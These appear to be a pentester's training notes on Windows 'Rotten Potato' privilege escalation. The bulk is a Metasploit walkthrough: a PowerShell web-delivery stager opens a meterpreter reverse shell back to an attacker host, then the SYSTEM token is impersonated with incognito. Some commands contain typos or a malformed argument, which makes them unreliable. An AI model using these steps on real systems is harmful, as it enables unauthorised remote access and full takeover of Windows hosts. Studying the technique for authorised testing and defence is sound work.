To check if there is a Potatoe Exploit:
    1-in Windows shell:
        systeminfo 
    
    2-Copy the rsult in Kali

        nano sysinfo.txt

        ./windows-exploit-suggester.py --database 2024-01-18-mssb.xls --sysinfo.txt

    3-Then check in the exploit suggester if there is a Potatoe Exploit

Rotten Potato – Privilege Escalation from Service Accounts to SYSTEM:
    https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
        The idea behind this vulnerability is simple to describe at a high level:

            1-Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.
            
            2-Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.
            
            3-Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

        RottenPotatoNG and its variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and 
        when you have SeImpersonate or "SeAssignPrimaryToken" privileges. 
        During a Windows build review we found a setup where BITS was intentionally disabled and port 6666 was taken.

Exploit Potatoe:

    1-msfconsole
        use exploit/multi/script/web_delivery
        show targets
            2 - PSH 

            set target 2

            set payload windows/meterpreter/reverse_tcp <-- x64 sometimes don't work 

            set lhost <KALI IP>

            set srvhost <KALI IP>

            options <-- to check if the necessary stuf is set 

            run

    2-Copy the msfconsole command to the Windows Machine

    3-in msf explit > sessions 1
        We should get a METERPRETER Shell

        getprivs

        run 

    4-Escalation via Potatoe:

        load incognito

        list_tokens -u 

        impersonate_token "NT AUTHORITY\SYSTEM"

        shell 

        C:\Windows> whoami
            nt authority system
